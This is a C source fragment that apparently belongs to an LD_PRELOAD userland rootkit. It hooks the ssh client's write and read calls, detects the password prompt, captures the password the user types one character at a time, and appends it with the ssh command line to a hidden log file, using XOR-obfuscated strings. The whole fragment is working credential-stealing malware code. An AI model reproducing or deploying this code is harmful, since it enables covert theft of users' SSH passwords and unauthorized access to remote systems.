int is_pwprompt(int fd, const void *buf){
    struct stat s_fstat;
    hook(C__FXSTAT);
    memset(&s_fstat, 0, sizeof(stat));
    (void)call(C__FXSTAT, _STAT_VER, fd, &s_fstat);
    if(S_ISSOCK(s_fstat.st_mode)) return 0;

    if(buf != NULL && xstrstr(PW_STR, (char *)buf))
        return 1;

    return 0;
}

ssize_t hijack_write_ssh(int fd, const void *buf, ssize_t o){
    if(!xprocess(SSH_STR)) return o;

    if(is_pwprompt(fd, buf)){
        ssh_pass_size = 0;
        memset(ssh_pass, 0, sizeof(ssh_pass));
        ssh_start = 1;
    }

    return o;
}

ssize_t log_ssh(int fd, void *buf, ssize_t o){
    if(fd == 0) return o;

    struct stat s_fstat;
    FILE *fp;
    char *p;

    hook(C__FXSTAT);

    memset(&s_fstat, 0, sizeof(stat));
    (void)call(C__FXSTAT, _STAT_VER, fd, &s_fstat);
    if(S_ISSOCK(s_fstat.st_mode)) return o;

    if(xprocess(SSH_STR) && fd == 4 && ssh_start){
        p = buf;
        
        if(*p == '\n'){
            ssh_start = 0;
            if((fp = xfopen(SSH_LOGS, "a"))){
                xor(fstr, FMT_STR);
                (void)fprintf(fp, fstr, get_process_cmdline(getpid()), ssh_pass);
                clean(fstr);
                (void)fflush(fp);
                (void)fclose(fp);
            }

            return o;
        }
        ssh_pass[ssh_pass_size++] = *p;
    }

    return o;
}